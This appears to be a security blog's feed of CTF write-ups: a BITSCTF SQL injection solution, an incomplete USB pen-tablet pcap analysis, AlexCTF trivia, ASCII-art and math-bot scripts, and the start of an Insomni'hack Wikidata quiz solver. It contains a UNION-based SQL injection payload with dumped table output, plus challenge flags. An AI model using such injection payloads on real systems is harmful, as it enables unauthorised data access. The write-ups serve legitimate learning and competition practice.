<td>CIA_Official_Records</td>
<td>first_name</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>last_name</td>
</tr>
<tr>
<td>Joker</td>
<td>Flag</td>
</tr>
<tr>
<td>Joker</td>
<td>HaHaHa</td>
</tr>
</tbody>
</table>
<p>Pretty easy to know where to find teh flag now: <code>' or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #</code>:</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>HaHaHa</th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}</td>
<td>Enjoying the game Batman!!!</td>
</tr>
</tbody>
</table>
<h2 id="50-tom-and-jerry-forensics">50 - Tom and Jerry - Forensics</h2>
<p><strong>WARNING</strong>: we didn't solve this challenge, so write-up is incomplete.</p>
<p>Open the pcapng with Wireshark.</p>
<p>Device Descriptor tell us:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">idVendor: Wacom Co., Ltd (0x056a)</div><div class="line">idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)</div></pre></td></tr></table></figure></p>
<p>So this is a Pen Tablet.</p>
<p>We can use a filter <code>usb.transfer_type == 0x01</code> to oly see frame where there is data.</p>
<p>We can complete the filter with <code>(frame.len == 73)</code> to see only one side of the exchange and <code>!(usb.capdata == 00:00:00:00:00:00:00:00)</code> to hide null data. Finally that give us this filter: <code>((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00)</code>.</p>
<p>USB transfert type is <em>USB INTERRUPT</em>: <a href="http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt" target="_blank" rel="external">http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt</a></p>
<p>To extract the data only from the pcapng I used tshark:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt</div></pre></td></tr></table></figure></p>
<p>I didn't have time to search how to interpret the raw data into coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>AlexCTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/AlexCTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/AlexCTF-2017-write-ups/</id>
    <published>2017-02-04T23:00:00.000Z</published>
    <updated>2017-02-07T21:03:11.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : AlexCTF 2017</li>
<li><strong>Website</strong> : <a href="https://ctf.oddcoder.com/" target="_blank" rel="external">ctf.oddcoder.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/408/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="10-tr1-hello-there-trivia">10 - TR1: Hello there - Trivia</h2>
<blockquote>
<p>Why not drop us a few lines and say hi :).</p>
</blockquote>
<p>Go to the irc: <code>#alexctf @freenode</code> and get the flag with <code>/topic</code>.</p>
<h2 id="20-tr2-ssl-0day-trivia">20 - TR2: SSL 0day - Trivia</h2>
<blockquote>
<p>It lead to memory leakage between servers and clients rending large number of private keys accessible. (one word)</p>
</blockquote>
<p>Answer: <strong>heartbleed</strong> (<a href="http://heartbleed.com/" target="_blank" rel="external">details</a>)</p>
<h2 id="30-tr3-ca-trivia">30 - TR3: CA - Trivia</h2>
<blockquote>
<p>What is the CA that issued Alexctf https certificate</p>
<p>(flag is lowercase with no spaces)</p>
</blockquote>
<p>Answer: <strong>letsencrypt</strong></p>
<h2 id="40-tr4-doesn-t-our-logo-look-cool-trivia">40 - TR4: Doesn't our logo look cool ? - Trivia</h2>
<p>Here is the logo:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&apos;@+.                                                                                          </div><div class="line">@@@@@@@:                                                                                        </div><div class="line">@@@@@@@@@#                                                                                       </div><div class="line">@@@@@@@@@@@,                                                                                      </div><div class="line">&apos;@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@.                                                                                     </div><div class="line">@@@@@@@@@@@@@,                                                                                     </div><div class="line">@@@@A@@@@@@@@                                                                                      </div><div class="line">+@@@@@@@@@@@@                       .:++@@@@@+:.                                                   </div><div class="line">@@@@@@@@@@@&apos;                .+@@@@@@@@@@@@@@@@@@@@@`                                              </div><div class="line">.@@@@@@@@@@            .#@@@@@@@@@@@@@@L@@@@@@@@@@@@@#                                            </div><div class="line">+@@@@@@@@         `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                   .@@.   </div><div class="line">+@@@E@@@@      .@@@@@@X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                              &apos;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@C@@.                       `+@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@T@@@@@@@@@@@&apos;,`       .+@@@@@@@@@@@@@@@:              `:@@@@@@F@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@+.                    ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@,                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                               +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                   ;@@@@@@@@@@@@&#123;@@@@@@@@@@@#,   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                       &apos;@@@@@@@@@@@@@@+,         ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                        :;.                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    @     ;@       @@@@@@@  @`   `@   +@@#@@  &apos;@@@@@@@  @@@@@@@, ;@@@0@.   </div><div class="line">+@@@@U@@@      ;@@@@@.    @+    ;@       @        .@   @,   @    #@    `@     @        ;@@@@@.   </div><div class="line">+@@@@@R@@      ;@@@@@.   .@@    ;@       @         @` `@   :@     @    `@     @        ;@@@_@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @,@    ;@       @         ,@ @,   ;@     `    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ @:   ;@       @          @`@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ .@   ;@       @          ,@:    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  +#  @   ;@       @@@@@@      @     ;@          `@     @@@@@@   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   @`  ;@       @          @+@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   &apos;#  ;@       @          @ @    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. ,@@@@@@  ;@       @         @; :@   ;@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @:    @  ;@       @         @   @   ,@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @     @; ;@       @        @;   :@   @,   @&apos;    `@     @        ;@@@@@.   </div><div class="line">+@@@@@L@@      ;@@@@@. @     .@ ;@@@@@@  @@@@@@@  @     @    @@@@#     `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@0@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@G@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.             ..,:,..                                             ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    `&apos;@@@@@@@@@@@@@@@@@@@@:                                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.+@@@@@@@@@@@@@0@@@@@@@@@@@@@@@.                                  ;@@@_@.   </div><div class="line">+@@R@@@@@      ;@@@@0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                                ;@@C@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`                            .@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@K@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                    `&apos;@@@@@S@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@+;;...;;+@@@@@@@@@@@@@@@@@@@@@@+:.    ..:+@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@#,                    &apos;@@@@@&#125;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@;                            ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@#                                  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#      </div><div class="line">+@@@@@@@@      ,                                        ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.         </div><div class="line">+@@@@@@@@                                                  `+@@@@@@@@@@@@@@@@@@@@#,              </div><div class="line">+@@@@@@@@                                                         .;&apos;+++&apos;;.                      </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+++++++++++++++++++#@@@@@@@@+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</div></pre></td></tr></table></figure></p>
<p>Let's write a very short ruby script to filter that:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">logo = open(<span class="string">"logo.txt"</span>, <span class="string">'r'</span>).read()</div><div class="line"><span class="comment">#flag = logo.gsub(/[^a-zA-Z0-9&#123;&#125;_]/, '')</span></div><div class="line">flag = logo.gsub(<span class="regexp">/[#@.;:+,`'\s]/</span>, <span class="string">''</span>)</div><div class="line">puts flag</div></pre></td></tr></table></figure></p>
<p>Flag: <code>ALEXCTF{0UR_L0G0_R0CKS}</code></p>
<h2 id="100-sc1-math-bot-scripting">100 - SC1: Math bot - Scripting</h2>
<blockquote>
<p>It is well known that computers can do tedious math faster than human.</p>
<p>nc 195.154.53.62 1337</p>
<p>Update</p>
<p>we got another mirror here</p>
<p>nc 195.154.53.62 7331</p>
</blockquote>
<p>The server send some calculations with big integers and we have to solve a lot of them.</p>
<p>To do that I did a ruby bot:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'195.154.53.62'</span></div><div class="line">port = <span class="number">1337</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line"></div><div class="line">raw = <span class="string">''</span></div><div class="line">res = <span class="literal">nil</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/=$/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        calc = raw.match(<span class="regexp">/^([0-9]*) ([+\-%*\/]) ([0-9]*) =/</span>)</div><div class="line">        a = calc.captures[<span class="number">0</span>].to_i</div><div class="line">        oper = calc.captures[<span class="number">1</span>]</div><div class="line">        b = calc.captures[<span class="number">2</span>].to_i</div><div class="line">        <span class="keyword">if</span> oper == <span class="string">'+'</span></div><div class="line">            res = a + b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'-'</span></div><div class="line">            res = a - b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'*'</span></div><div class="line">            res = a * b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'%'</span></div><div class="line">            res = a % b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'/'</span></div><div class="line">            res = a / b</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"That's not good..."</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">if</span> res != <span class="literal">nil</span></div><div class="line">            puts res</div><div class="line">            s.puts res</div><div class="line">        <span class="keyword">end</span></div><div class="line">        res = <span class="literal">nil</span></div><div class="line">        raw = <span class="string">''</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
<p><em>Note</em>: I chose not to use some exec function because I don't trust external entries.</p>
<p>Here an example of output and the flag:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">                __________</div><div class="line">         ______/ ________ \______</div><div class="line">       _/      ____________      \_</div><div class="line">     _/____________    ____________\_</div><div class="line">    /  ___________ \  / ___________  \</div><div class="line">   /  /XXXXXXXXXXX\ \/ /XXXXXXXXXXX\  \</div><div class="line">  /  /############/    \############\  \</div><div class="line">  |  \XXXXXXXXXXX/ _  _ \XXXXXXXXXXX/  |</div><div class="line">__|\_____   ___   //  \\   ___   _____/|__</div><div class="line">[_       \     \  X    X  /     /       _]</div><div class="line">__|     \ \                    / /     |__</div><div class="line">[____  \ \ \   ____________   / / /  ____]</div><div class="line">     \  \ \ \/||.||.||.||.||\/ / /  /</div><div class="line">      \_ \ \  ||.||.||.||.||  / / _/</div><div class="line">        \ \   ||.||.||.||.||   / /</div><div class="line">         \_   ||_||_||_||_||   _/</div><div class="line">           \     ........     /</div><div class="line">            \________________/</div><div class="line"></div><div class="line">Our system system has detected human traffic from your IP!</div><div class="line">Please prove you are a bot</div><div class="line">Question  1 :</div><div class="line">188284398378183198274310077338361 - 222311858895894501436877647952618 =</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">Question  250 :</div><div class="line">198932319558549559940672382195244 % 276981013309967153730940955239195 =</div><div class="line">Well no human got time to solve 500 ridiculous math challenges</div><div class="line">Congrats MR bot!</div><div class="line">Tell your human operator flag is: ALEXCTF&#123;1_4M_l33t_b0t&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - cryptoquizz - Misc</title>
    <link href="https://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/"/>
    <id>https://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.685Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Insomni'hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>cryptoquizz - Misc/Crypto - 50 pts - realized by cryptopathe</p>
<p>Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to prove us that you are a genuine cryptographer.</p>
<p>Running on <a href="http://quizz.teaser.insomnihack.ch:1031" target="_blank" rel="external">quizz.teaser.insomnihack.ch:1031</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p><strong>Goal</strong>: In this challenge, a server a get us a name (of a famous cryptographer) and we have to find his/her birth year. Then we must send the year to the server and do it again for others cryptographers until we get the flag.</p>
<p>To find the year of someone famous it is possible to use the <a href="https://www.mediawiki.org/wiki/API" target="_blank" rel="external">Wikimedia API</a>. I tried the API <a href="https://en.wikipedia.org/wiki/Special:ApiSandbox" target="_blank" rel="external">sandbox</a> and figured that it was difficult to use it manually.</p>
<p>The wikimedia API works for all the Wikimedia Fundation entities, for example: Wikipedia, Wikidata,...</p>
<p>As we only want the birt year of the cryptographer we should prefer to use <a href="https://www.wikidata.org/" target="_blank" rel="external">Wikidata</a> instead of <a href="https://en.wikipedia.org/" target="_blank" rel="external">wikipedia</a>, there is less data to parse.</p>
<p>As I like ruby for scripting, I chose to use a ruby gem: a Wikidata API Client named <a href="https://rubygems.org/gems/wikidata-client/" target="_blank" rel="external"><strong>wikidata-client</strong></a>. Here is the <a href="http://www.rubydoc.info/gems/wikidata-client/" target="_blank" rel="external">documentation</a>.</p>
<p>Fist I only looked for the first person of the result. But I had soem wrong asnwer.
Because the server is giving wrong or partial name.
For example the server give <em>Ross Anderson</em> but there are:</p>
<ul>
<li><em>Ross Anderson</em> an alpine skier</li>
<li><em>Ross Anderson</em> a swimmer</li>
<li><em>Ross J. Anderson</em> a computer scientist, cryptographer</li>
</ul>
<p>Another example is the server also giving diminutive or nickname like <em>Ron Rivest</em> for <em>Ronald Rivest</em>. This is not a problem for Ronald but with <em>Jim Massey</em> this is. There is a cryptographer named <em>James Lee Massey</em> and his nickname <em>Jimmy Massey</em> and the diminutive of <em>Jimmy</em> is <em>Jim</em>. Problem is that the real <em>Jim Massey</em> is a comics writer and the server is giving a diminutive of a nickname of <em>James Lee Massey</em>...</p>
<p>So I had to create a <em>homonym avoidance</em> by checking the occupation of the person but this function takes too much time as it needs more requests and regex. So I finally disabled this function because it was making my requests timed out.
So I had to run my script several and have the luck not to search for ambiguous name and to finally get the flag.</p>
<p>Here is my ruby script:</p>
